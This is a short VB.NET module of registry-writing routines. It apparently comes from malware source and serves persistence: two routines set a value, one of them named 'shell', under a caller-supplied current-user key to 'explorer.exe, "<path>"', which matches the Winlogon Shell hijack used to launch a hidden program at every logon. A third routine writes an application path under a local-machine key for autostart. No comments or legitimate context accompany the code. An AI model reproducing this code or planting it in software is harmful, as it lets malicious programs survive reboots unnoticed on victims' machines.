Imports Microsoft.Win32
Module StartupRegistryModule
    Public Sub Set_registry(ByVal reglocal As String, ByVal path As String)
        Dim regKey As RegistryKey
        regKey = Registry.CurrentUser.OpenSubKey(reglocal, True)
        regKey.SetValue("shell", "explorer.exe, " & """" & path & """")
        regKey.Close()
    End Sub
    Public Sub Set_CurrentUser_registry(ByVal reglocal As String, ByVal execute As String, ByVal shell As String)
        Dim regKey As RegistryKey
        regKey = Registry.CurrentUser.OpenSubKey(reglocal, True)
        regKey.SetValue(shell, "explorer.exe, " & """" & execute & """")
        regKey.Close()
    End Sub
    Public Sub Set_LocalMachine_registry(ByVal reglocal As String, ByVal applicationName As String, ByVal applicationPath As String)
        Dim regKey As RegistryKey
        regKey = Registry.LocalMachine.OpenSubKey(reglocal, True)
        regKey.SetValue(applicationName, """" & applicationPath & """")
        regKey.Close()
    End Sub
End Module
